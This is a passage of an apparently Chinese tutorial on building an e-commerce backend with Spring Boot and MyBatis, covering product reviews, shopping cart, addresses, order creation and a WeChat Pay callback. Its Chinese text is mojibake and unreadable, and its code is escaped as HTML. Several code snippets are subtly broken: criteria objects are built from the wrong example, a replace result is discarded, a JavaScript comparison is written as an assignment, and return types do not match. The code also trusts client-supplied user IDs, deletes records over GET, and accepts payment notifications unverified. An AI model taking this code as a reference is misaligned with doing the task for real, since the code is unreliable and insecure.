jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;username&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;username&quot; /&gt; &lt;result column=&quot;nickname&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;nickname&quot; /&gt; &lt;result column=&quot;user_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userImg&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectCommontsByProductId&quot; resultMap=&quot;ProductCommentsVOMap&quot;&gt; select u.username, u.nickname, u.user_img, c.comm_id, c.product_id, c.product_name, c.order_item_id, c.user_id, c.is_anonymous, c.comm_type, c.comm_level, c.comm_content, c.comm_imgs, c.sepc_name, c.reply_status, c.reply_content, c.reply_time, c.is_show from product_comments c INNER JOIN users u ON u.user_id = c.user_id WHERE c.product_id =#&#123;productId&#125; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; serevice æ·»åŠ å®ä½“ç±»ProductCommentsVO @Data @AllArgsConstructor @NoArgsConstructor public class ProductCommentsVO &#123; private String commId; private String productId; private String productName; private String orderItemId; private Integer isAnonymous; private Integer commType; private Integer commLevel; private String commContent; private String commImgs; private Date sepcName; private Integer replyStatus; private String replyContent; private Date replyTime; private Integer isShow; //å°è£…è¯„è®ºå¯¹åº”çš„ç”¨æˆ·æ•°æ® private String userId; private String username; private String nickname; private String userImg; &#125; æ·»åŠ åˆ†é¡µå®ä½“ç±» @Data @NoArgsConstructor @AllArgsConstructor public class PageHelper&lt;T&gt; &#123; //æ€»è®°å½•æ•° private int count; //æ€»é¡µæ•° private int pageCount; //åˆ†é¡µæ•°æ® private List&lt;T&gt; list; &#125; Serviceçš„ä»£ç  @Override public ResultVO listCommontsByProductId(String productId,int pageNum,int limit) &#123; //List&lt;ProductCommentsVO&gt; productCommentsVOS = productCommentsMapper.selectCommontsByProductId(productId); //1.æ ¹æ®å•†å“idæŸ¥è¯¢æ€»è®°å½•æ•° Example example = new Example(ProductComments.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); int count = productCommentsMapper.selectCountByExample(example); //2.è®¡ç®—æ€»é¡µæ•°ï¼ˆå¿…é¡»ç¡®å®šæ¯é¡µæ˜¾ç¤ºå¤šå°‘æ¡ pageSize = limitï¼‰ int pageCount = count%limit==0? count/limit : count/limit+1; //3.æŸ¥è¯¢å½“å‰é¡µçš„æ•°æ®ï¼ˆå› ä¸ºè¯„è®ºä¸­éœ€è¦ç”¨æˆ·ä¿¡æ¯ï¼Œå› æ­¤éœ€è¦è¿è¡¨æŸ¥è¯¢---è‡ªå®šä¹‰ï¼‰ int start = (pageNum-1)*limit; List&lt;ProductCommentsVO&gt; list = productCommentsMapper.selectCommontsByProductId(productId, start, limit); return ResultVO.success(list); &#125; controller @ApiOperation(&quot;å•†å“è¯„ä»·åˆ†é¡µæŸ¥è¯¢æ¥å£&quot;) @GetMapping(&quot;/detail-commonts/&#123;pid&#125;&quot;) public ResultVO getProductCommonts(@PathVariable(&quot;pid&quot;) String pid, @RequestParam(&quot;pageNum&quot;) int pageNum, @RequestParam(&quot;limit&quot;) int limit)&#123; return productCommontsService.listCommontsByProductId(pid, pageNum, limit); &#125; æ¥å£æµ‹è¯• è¯„ä»·åˆ†æ å¯¹è¯¥å•†å“çš„è¯„ä»·è¿›è¡Œåˆ†ç±»ï¼Œåˆ†ä¸ºå¥½è¯„ä¸­è¯„å’Œå·®è¯„ å“åº”æ•°æ®å¦‚å›¾æ‰€ç¤ºï¼Œå¯ä»¥çœ‹å‡ºæ˜¯å•è¡¨æŸ¥è¯¢ service @Override public ResultVO getCommentsCountByProductId(String productId) &#123; // æŸ¥è¯¢å•†å“æ€»æ•° Example example = new Example(ProductComments.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); int total = productCommentsMapper.selectCountByExample(criteria); // æŸ¥è¯¢å¥½è¯„æ•° Example example1 = new Example(ProductComments.class); Example.Criteria criteria1 = example1.createCriteria(); criteria1.andEqualTo(&quot;productId&quot;,productId); criteria1.andEqualTo(&quot;commType&quot;, 1); int goodTotal = productCommentsMapper.selectCountByExample(example1); // æŸ¥è¯¢ä¸­è¯„æ•° Example example2 = new Example(ProductComments.class); Example.Criteria criteria2 = example1.createCriteria(); criteria2.andEqualTo(&quot;productId&quot;,productId); criteria2.andEqualTo(&quot;commType&quot;, 0); int midTotal = productCommentsMapper.selectCountByExample(example2); // æŸ¥è¯¢å·®è¯„æ•° Example example3 = new Example(ProductComments.class); Example.Criteria criteria3 = example1.createCriteria(); criteria3.andEqualTo(&quot;productId&quot;,productId); criteria3.andEqualTo(&quot;commType&quot;, -1); int badTotal = productCommentsMapper.selectCountByExample(example3); // å¥½è¯„ç‡ double percent = (Double.parseDouble(goodTotal+&quot;&quot;)/Double.parseDouble(total + &quot;&quot;)) * 100; String percentValue = (percent+&quot;&quot;).substring(0,(percent+&quot;&quot;).lastIndexOf(&quot;.&quot;)+3); HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;total&quot;, total); hashMap.put(&quot;goodTotal&quot;, goodTotal); hashMap.put(&quot;badTotal&quot;, badTotal); hashMap.put(&quot;midTotal&quot;, midTotal); hashMap.put(&quot;percent&quot;, percentValue); return ResultVO.success(hashMap); &#125; controller @ApiOperation(&quot;å•†å“æ€»ä½“è¯„ä»·ä¿¡æ¯æŸ¥è¯¢æ¥å£&quot;) @GetMapping(&quot;/detail-commontscount/&#123;pid&#125;&quot;) public ResultVO getProductCommontscount(@PathVariable(&quot;pid&quot;) String pid)&#123; return productCommontsService.getCommentsCountByProductId(pid); &#125; 1.9 è´­ç‰©è½¦ä¸šåŠ¡æ·»åŠ è´­ç‰©è½¦ Service private SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;); @Override public ResultVO addShoppingCart(ShoppingCart cart) &#123; cart.setCartTime(sdf.format(new Date())); int i = shoppingCartMapper.insert(cart); if(i&gt;0)&#123; return new ResultVO(ResStatus.OK,&quot;success&quot;,null); &#125;else&#123; return new ResultVO(ResStatus.NO,&quot;fail&quot;,null); &#125; Controller @PostMapping(&quot;/add&quot;) public ResultVO addShoppingCart(@RequestBody ShoppingCart cart)&#123; ResultVO resultVO = shoppingCartService.addShoppingCart(cart); return resultVO; &#125; è·å–è´­ç‰©è½¦åˆ—è¡¨ sql select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props,p.product_name, i.url,s.original_price,s.sell_price,s.sku_name from shopping_cart c inner JOIN product p INNER JOIN product_sku s INNER JOIN product_img i ON c.product_id &#x3D; p.product_id AND c.sku_id&#x3D;s.sku_id AND c.product_id&#x3D;i.item_id WHERE c.user_id &#x3D; 1 AND i.is_main&#x3D;1 dao åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä½“ç±»ç”¨äºä¿å­˜è¿”å›çš„æ•°æ® @Data @NoArgsConstructor @AllArgsConstructor public class ShoppingCartVO &#123; private Integer cartId; private String productId; private String skuId; private String userId; private String cartNum; private String cartTime; private BigDecimal productPrice; private String skuProps; private String productName; private String productImg; private double originalPrice; private double sellPrice; private String skuName; private int skuStock; //åº“å­˜ &#125; mapper public List&lt;ShoppingCartVO&gt; selectShopcartByUserId(int userId); xml &lt;resultMap id=&quot;ShoppingCartVOMap&quot; type=&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;&gt; &lt;id column=&quot;cart_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;cartId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;cart_num&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartNum&quot; /&gt; &lt;result column=&quot;cart_time&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartTime&quot; /&gt; &lt;result column=&quot;product_price&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;productPrice&quot; /&gt; &lt;result column=&quot;sku_props&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuProps&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;url&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productImg&quot; /&gt; &lt;result column=&quot;original_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;originalPrice&quot; /&gt; &lt;result column=&quot;sell_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;sellPrice&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectShopcartByUserId&quot; resultMap=&quot;ShoppingCartVOMap&quot;&gt; select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id = p.product_id and i.item_id=p.product_id and c.sku_id=s.sku_id where user_id = #&#123;userId&#125; and i.is_main=1 &lt;/select&gt; service @Transactional(propagation = Propagation.SUPPORTS) public ResultVO listShoppingCartsByUserId(int userId) &#123; List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByUserId(userId); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;success&quot;, list); return resultVO; &#125; controller @GetMapping(&quot;/list&quot;) @ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;ç”¨æˆ·ID&quot;,required = true) public ResultVO list(Integer userId,@RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = shoppingCartService.listShoppingCartsByUserId(userId); return resultVO; &#125; æ›´æ–°è´­ç‰©è½¦ æ›´æ–°è´­ç‰©è½¦å‘é€çš„è¯·æ±‚å¦‚ä¸‹ï¼Œç”±åˆ†æå¯ä»¥çœ‹å‡ºurlçš„æ ¼å¼å¦‚ä¸‹ï¼Œå¹¶ä¸”å‘é€çš„æ˜¯putè¯·æ±‚ /shopcart/update/&#123;cartId&#125;/&#123;num&#125; sql ä½¿ç”¨updateæ–¹æ³•å¯¹å¯¹åº”çš„è´­ç‰©è½¦è®°å½•è¿›è¡Œä¿®æ”¹å³å¯ update shopping_cart set cart_num=3 where cart_id=1 dao xml &lt;select id=&quot;selectShopcartByUserId&quot; resultMap=&quot;ShoppingCartVOMap&quot;&gt; select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id = p.product_id and i.item_id=p.product_id and c.sku_id=s.sku_id where user_id = #&#123;userId&#125; and i.is_main=1 &lt;/select&gt; &lt;update id=&quot;updateCartnumByCartid&quot;&gt; update shopping_cart set cart_num=#&#123;cartNum&#125; where cart_id=#&#123;cartId&#125; &lt;/update&gt; mapper public int updateCartnumByCartid(@Param(&quot;cartId&quot;) int cartId, @Param(&quot;cartNum&quot;) int cartNum); service @Override public ResultVO updateCartNum(int cartId, int cartNum) &#123; int i = shoppingCartMapper.updateCartnumByCartid(cartId, cartNum); if(i&gt;0)&#123; return new ResultVO(ResStatus.OK,&quot;update success&quot;,null); &#125;else&#123; return new ResultVO(ResStatus.NO,&quot;update fail&quot;,null); &#125; &#125; controller @PutMapping(&quot;/update/&#123;cid&#125;/&#123;cnum&#125;&quot;) public ResultVO updateNum(@PathVariable(&quot;cid&quot;) Integer cartId, @PathVariable(&quot;cnum&quot;) Integer cartNum, @RequestHeader(&quot;token&quot;) String token)&#123; ResultVO resultVO = shoppingCartService.updateCartNum(cartId, cartNum); return resultVO; &#125; è·å–è´­ç‰©è½¦åˆ—è¡¨ä¿¡æ¯ å½“ç‚¹å‡»ç»“ç®—æ—¶ï¼Œé¡µé¢ä¼šè·³è½¬åˆ°ç»“ç®—é¡µé¢ï¼Œè¿™é‡Œä¾ç„¶éœ€è¦æ˜¾ç¤ºè®¢å•ä¸­çš„ä¿¡æ¯ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦çš„æ˜¯æ‰¹é‡ç»“ç®—ï¼Œæ‰€ä»¥éœ€è¦æ‰¹é‡è·å– ä»å‰ç«¯å‘èµ·çš„è¯·æ±‚å¯ä»¥çœ‹åˆ°cidsä¸ºæœ¬æ¬¡è¯·æ±‚çš„æ‰€æœ‰è´­ç‰©è½¦è®¢å• å“åº”ç»“æœå¦‚ä¸‹ ä»ä¸­å¯ä»¥çœ‹åˆ°ä¸è·å–è´­ç‰©è½¦åˆ—è¡¨ä½¿ç”¨åˆ°çš„sqlè¯­å¥å¤§è‡´ç›¸åŒ sql select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id &#x3D; p.product_id and i.item_id&#x3D;p.product_id and c.sku_id&#x3D;s.sku_id where i.is_main&#x3D;1 and c.cart_id in (6,7) dao åˆ›å»ºæ–°çš„å®ä½“ç±»ä¿å­˜ç»“æœ /** * æ–°å¢ productNameã€productImg */ @Data @NoArgsConstructor @AllArgsConstructor public class ShoppingCartVO &#123; private Integer cartId; private String productId; private String skuId; private String userId; private String cartNum; private String cartTime; private BigDecimal productPrice; private String skuProps; private String productName; private String productImg; private double originalPrice; private double sellPrice; private String skuName; private int skuStock; //åº“å­˜ &#125; Mapperä¸­ä»£ç  public List&lt;ShoppingCartVO&gt; selectShopcartByCids(List&lt;Integer&gt; cids); xml &lt;resultMap id=&quot;ShoppingCartVOMap2&quot; type=&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;&gt; &lt;id column=&quot;cart_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;cartId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;cart_num&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartNum&quot; /&gt; &lt;result column=&quot;cart_time&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartTime&quot; /&gt; &lt;result column=&quot;product_price&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;productPrice&quot; /&gt; &lt;result column=&quot;sku_props&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuProps&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;url&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productImg&quot; /&gt; &lt;result column=&quot;original_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;originalPrice&quot; /&gt; &lt;result column=&quot;sell_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;sellPrice&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;result column=&quot;stock&quot; property=&quot;skuStock&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectShopcartByCids&quot; resultMap=&quot;ShoppingCartVOMap2&quot;&gt; select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id = p.product_id and i.item_id=p.product_id and c.sku_id=s.sku_id where i.is_main=1 and c.cart_id in &lt;foreach collection=&quot;cids&quot; item=&quot;cid&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt; #&#123;cid&#125; &lt;/foreach&gt; &lt;/select&gt; service @Override public ResultVO listShoppingCartsByCids(String cids) &#123; // å°†å‰ç«¯è¯·æ±‚æºå¸¦çš„å­—ç¬¦ä¸²è½¬æ¢æˆintæ•°ç»„ List&lt;Integer&gt; cartIds = new ArrayList&lt;&gt;(); String[] strings = cids.split(&quot;,&quot;); for (String string : strings) &#123; cartIds.add(Integer.parseInt(string)); &#125; List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByCids(cartIds); return ResultVO.success(list); &#125; controller @GetMapping(&quot;/listbycids&quot;) @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;é€‰æ‹©çš„è´­ç‰©è½¦è®°å½•çš„id&quot;,required = true) public ResultVO listByCids(String cids, @RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = shoppingCartService.listShoppingCartsByCids(cids); return resultVO; &#125; åˆ é™¤è´­ç‰©è½¦ sql åˆ é™¤æ•°æ®æ—¶ï¼Œå¯ä»¥æ‰¹é‡åˆ é™¤ä¹Ÿå¯ä»¥æ˜¯å•ä¸ªåˆ é™¤ï¼Œå› æ­¤ä½¿ç”¨ä¸‹é¢çš„sqlè¯­å¥ delete from shopping_cart where cart_id IN (10,11) dao public int deleteShopcartByCids(List&lt;Integer&gt; cids); &lt;delete id=&quot;deleteShopcartByCids&quot;&gt; delete from shopping_cart where cart_id in &lt;foreach collection=&quot;cids&quot; item=&quot;cid&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt; #&#123;cid&#125; &lt;/foreach&gt; &lt;/delete&gt; service @Override public ResultVO deleteShoppingCartsByCids(String cids) &#123; // å°†å‰ç«¯è¯·æ±‚æºå¸¦çš„å­—ç¬¦ä¸²è½¬æ¢æˆintæ•°ç»„ List&lt;Integer&gt; cartIds = new ArrayList&lt;&gt;(); String[] strings = cids.split(&quot;,&quot;); for (String string : strings) &#123; cartIds.add(Integer.parseInt(string)); &#125; int i = shoppingCartMapper.deleteShopcartByCids(cartIds); if(i &gt; 0)&#123; return ResultVO.success(); &#125;else &#123; return ResultVO.failed(&quot;åˆ é™¤å¤±è´¥ï¼&quot;); &#125; &#125; controller @GetMapping(&quot;/delete&quot;) @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;é€‰æ‹©çš„è´­ç‰©è½¦è®°å½•çš„id&quot;,required = true) public ResultVO deletebycids(String cids, @RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = shoppingCartService.deleteShoppingCartsByCids(cids); return resultVO; &#125; å‰ç«¯ä»£ç  ç”±äºè¯¥åŠŸèƒ½æ²¡æœ‰å†å‰ç«¯å®ç°å› æ­¤åœ¨shopcart.htmlé¡µé¢ä¸­åŠ å…¥å¦‚ä¸‹jsä»£ç  deleteByIds: function () &#123; if (this.opts.length == 0) &#123; alert(&quot;è¯·é€‰æ‹©è¦è´­ä¹°çš„å•†å“ï¼&quot;) &#125; else &#123; //1.è·å–é€‰æ‹©è´­ç‰©è½¦è®°å½•çš„id [0,2] ---&gt; cartId 8 cartId 10 --- 8,10, var cids = &quot;&quot;; for (var i = 0; i &lt; this.opts.length; i++) &#123; var index = this.opts[i]; var cartId = this.shopcarts[index].cartId; if (i &lt; this.opts.length - 1) &#123; cids = cids + cartId + &quot;,&quot;; &#125; else &#123; cids = cids + cartId; &#125; &#125; var url = baseUrl + &quot;shopcart/delete/?cids=&quot; + cids; axios(&#123; url: url, method: &quot;get&quot;, headers: &#123; token: this.token &#125; &#125;).then((res) =&gt; &#123; console.log(res); if (res.data.code = 10000) &#123; //é‡æ–°åˆ·æ–°è´­ç‰©è½¦ this.getShoppingCartList(); &#125; &#125;); &#125; &#125; æ¥å£æµ‹è¯• 1.10 æ”¶è´§åœ°å€è·å–æ”¶è·åœ°å€ç›´æ¥æ ¹æ®ç”¨æˆ·idå³å¯è·å–åˆ°æ”¶è·åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥ä½¿ç”¨tkMapperç”Ÿæˆçš„å³å¯ã€‚ service @Transactional(propagation = Propagation.SUPPORTS) public ResultVO listAddrsByUid(int userId) &#123; Example example = new Example(UserAddr.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;userId&quot;,userId); criteria.andEqualTo(&quot;status&quot;,1); List&lt;UserAddr&gt; userAddrs = userAddrMapper.selectByExample(example); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;success&quot;, userAddrs); return resultVO; &#125; controller @GetMapping(&quot;/list&quot;) @ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;ç”¨æˆ·ID&quot;,required = true) public ResultVO list(Integer userId,@RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = userAddrService.listAddrsByUid(userId); return resultVO; &#125; 1.11 è®¢å•ä¸šåŠ¡ è®¢å•æ·»åŠ æ¥å£ æ•°æ®åº“æ“ä½œ æ ¹æ®æ”¶è·åœ°å€çš„idï¼Œè·å–åœ°å€ä¿¡æ¯ æ ¹æ®è´­ç‰©è½¦idï¼ŒæŸ¥è¯¢è´­ç‰©è½¦çš„è¯¦ç»†ä¿¡æ¯ï¼ˆå…³è”å•†å“åç§°ï¼Œskuï¼Œåº“å­˜ï¼Œå•†å“å›¾ç‰‡ï¼Œä»·æ ¼ï¼‰ï¼Œç”¨äºç”Ÿæˆè®¢å•å¿«ç…§ ä¿å­˜è®¢å• ä¿å­˜å•†å“å¿«ç…§ ä¿®æ”¹åº“å­˜ service /** * ä¿å­˜è®¢å•ä¸šåŠ¡ * @param cids * @param order * @return * @throws SQLException */ @Transactional public ResultVO addOrder(String cids, Orders order) throws SQLException &#123; //å¤„ç†cids String[] strings = cids.split(&quot;,&quot;); List&lt;Integer&gt; cidsInt = new ArrayList&lt;&gt;(); for (String string : strings) &#123; cidsInt.add(Integer.parseInt(string)); &#125; // æŸ¥è¯¢ä¸å½“å‰è®¢å•ç›¸å…³è”çš„è´­ç‰©è½¦è®°å½• List&lt;ShoppingCartVO&gt; shopcartList = shoppingCartMapper.selectShopcartByCids(cidsInt); // åˆ¤æ–­å•†å“åº“å­˜æ˜¯å¦å……è¶³ boolean flag = true; String untitle = &quot;&quot;; // ä¿å­˜æ‰€æœ‰å•†å“çš„åç§° æœ€åä¿å­˜åˆ°è®¢å•å¿«ç…§ä¸­ for (ShoppingCartVO cartVO : shopcartList) &#123; if(Integer.parseInt(cartVO.getCartNum()) &gt; cartVO.getSkuStock())&#123; flag = false; &#125; untitle = untitle + cartVO.getProductName() + &quot;,&quot;; &#125; if(flag)&#123; // åº“å­˜å……è¶³ åˆ™ä¿å­˜è®¢å• // userId // untitle // æ”¯ä»˜æ—¶é—´ // æ”¶è´§äººçš„ä¿¡æ¯ // æ€»ä»·æ ¼ // æ”¯ä»˜æ–¹å¼ï¼ˆ1ï¼‰ // æ”¯ä»˜çŠ¶æ€ï¼ˆå¾…æ”¯ä»˜ï¼‰ order.setUntitled(untitle); order.setCancelTime(new Date()); order.setStatus(&quot;1&quot;); String orderId = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;); order.setOrderId(orderId); int i = ordersMapper.insert(order); // ç”Ÿæˆå•†å“å¿«ç…§ for (ShoppingCartVO sc: shopcartList) &#123; int cnum = Integer.parseInt(sc.getCartNum()); String itemId = System.currentTimeMillis()+&quot;&quot;+ (new Random().nextInt(89999)+10000); OrderItem orderItem = new OrderItem(itemId, orderId, sc.getProductId(), sc.getProductName(), sc.getProductImg(), sc.getSkuId(), sc.getSkuName(), new BigDecimal(sc.getSellPrice()), cnum, new BigDecimal(sc.getSellPrice() * cnum), new Date(), new Date(), 0); orderItemMapper.insert(orderItem); //å¢åŠ å•†å“é”€é‡ &#125; // æ‰£å‡åº“å­˜ // ä½¿ç”¨å½“å‰åº“å­˜å‡å»å•†å“æ•°é‡ for (ShoppingCartVO cartVO : shopcartList) &#123; String skuId = cartVO.getSkuId(); int newStock = cartVO.getSkuStock() - Integer.parseInt(cartVO.getCartNum()); Example example = new Example(ProductSku.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;skuId&quot;, skuId); // ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId); // productSku.setStock(newStock); // int k = productSkuMapper.updateByExample(productSku, example); ProductSku productSku = new ProductSku(); productSku.setStock(newStock); productSku.setSkuId(skuId); int k = productSkuMapper.updateByPrimaryKeySelective(productSku); &#125; //è´­ä¹°å®Œæˆå åˆ é™¤å¯¹åº”çš„è´­ç‰©è½¦æ•°æ® for (Integer cid : cidsInt) &#123; shoppingCartMapper.deleteByPrimaryKey(cid); &#125; return ResultVO.success(&quot;ç”Ÿæˆè®¢å•æˆåŠŸï¼&quot;, orderId); &#125;else &#123; return ResultVO.failed(&quot;å•†å“åº“å­˜ä¸è¶³ï¼Œè¯·é‡æ–°é€‰æ‹©ï¼&quot;); &#125; &#125; controller @PostMapping(&quot;/add&quot;) // @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;è´­ç‰©è½¦id&quot;,required = true) public ResultVO list(String cids, @RequestBody Orders order)&#123; System.out.println(&quot;##################&quot;); System.out.println(cids); if(cids.contains(&quot;#&quot;))&#123; cids.replace(&quot;#&quot;, &quot;&quot;); &#125; System.out.println(cids); try &#123; Map&lt;String, String&gt; orderInfo = orderService.addOrder(cids, order); String orderId = orderInfo.get(&quot;orderId&quot;); if(orderId !=null)&#123; Map&lt;String , String&gt; data = new HashMap&lt;&gt;(); data.put(&quot;body&quot;,orderInfo.get(&quot;productNames&quot;)); //å•†å“æè¿° data.put(&quot;out_trade_no&quot;,orderId); //ä½¿â½¤å½“å‰â½¤æˆ·è®¢å•çš„ç¼–å·ä½œä¸ºå½“å‰â½€ä»˜äº¤æ˜“çš„äº¤æ˜“å· data.put(&quot;fee_type&quot;,&quot;CNY&quot;); //â½€ä»˜å¸ç§ data.put(&quot;total_fee&quot;, order.getActualAmount()*100 + &quot;&quot; ); //â½€ä»˜â¾¦é¢ data.put(&quot;trade_type&quot;,&quot;NATIVE&quot;); //äº¤æ˜“ç±»å‹ data.put(&quot;notify_url&quot;,&quot;/pay/success&quot;); //è®¾ç½®â½€ä»˜å®Œæˆæ—¶çš„å›è°ƒâ½…æ³• WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); //å‘é€è¯·æ±‚ System.out.println(resp); String code_url = resp.get(&quot;code_url&quot;); orderInfo.put(&quot;code_url&quot;, code_url); return ResultVO.success(orderInfo); &#125;else &#123; return ResultVO.failed(&quot;è®¢å•ä¸ºç©ºï¼&quot;); &#125; &#125; catch (SQLException throwables) &#123; return ResultVO.failed(&quot;æ·»åŠ è®¢å•å¤±è´¥ï¼&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); return ResultVO.failed(&quot;æ·»åŠ è®¢å•å¤±è´¥ï¼&quot;); &#125; &#125; æ”¯ä»˜å›è°ƒ å½“ç”¨æˆ·æ”¯ä»˜æˆåŠŸåï¼Œæ”¯ä»˜å¹³å°ä¼šå‘æœåŠ¡å™¨çš„æŒ‡å®šæ¥å£å‘é€æ”¯ä»˜è®¢å•çš„æ”¯ä»˜çŠ¶æ€æ•°æ® åˆ›å»ºæ§åˆ¶å™¨å¹¶å®šä¹‰å›è°ƒæ¥å£ package com.qfedu.fmmall.controller; import com.github.wxpay.sdk.WXPayUtil; import com.qfedu.fmmall.entity.Orders; import com.qfedu.fmmall.service.OrderService; import com.qfedu.fmmall.vo.ResultVO; import io.swagger.annotations.Api; import io.swagger.annotations.ApiImplicitParam; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; import javax.servlet.ServletInputStream; import javax.servlet.http.HttpServletRequest; import java.io.IOException; import java.sql.SQLException; import java.util.HashMap; import java.util.Map; @RestController @RequestMapping(&quot;/pay&quot;) @Api(value = &quot;ç”¨æˆ·åœ°å€æ¥å£&quot;,tags = &quot;ç”¨æˆ·åœ°å€ç®¡ç†&quot;) @CrossOrigin public class PayController &#123; @Autowired private OrderService orderService; @GetMapping(&quot;/callable&quot;) public String success(HttpServletRequest request) throws Exception &#123; ServletInputStream is = request.getInputStream(); byte[] bytes = new byte[1024]; int len = -1; StringBuilder builder = new StringBuilder(); while((len = is.read(bytes)) != -1)&#123; builder.append(new String(bytes, 0 ,len)); &#125; String s = builder.toString(); // ä½¿ç”¨wxpayçš„å·¥å…·ç±»è®²xmlçš„å“åº”ç»“æœ è½¬æ¢æˆmap Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s); if(map != null &amp;&amp; &quot;success&quot;.equalsIgnoreCase(map.get(&quot;result_code&quot;)))&#123; // æ”¯ä»˜æˆåŠŸ // ä¿®æ”¹è®¢å•çŠ¶æ€ä¸ºä»£å‘è´§/å·²æ”¯ä»˜ String orderId = map.get(&quot;out_trade_no&quot;); int i = orderService.updateOrderStatus(orderId, &quot;2&quot;); if(i&gt;0)&#123; // å“åº”å¾®ä¿¡å¹³å° HashMap&lt;String, String&gt; resp = new HashMap&lt;&gt;(); resp.put(&quot;return_code&quot;, &quot;success&quot;); resp.put(&quot;return_msg&quot;, &quot;OK&quot;); resp.put(&quot;appid&quot;, 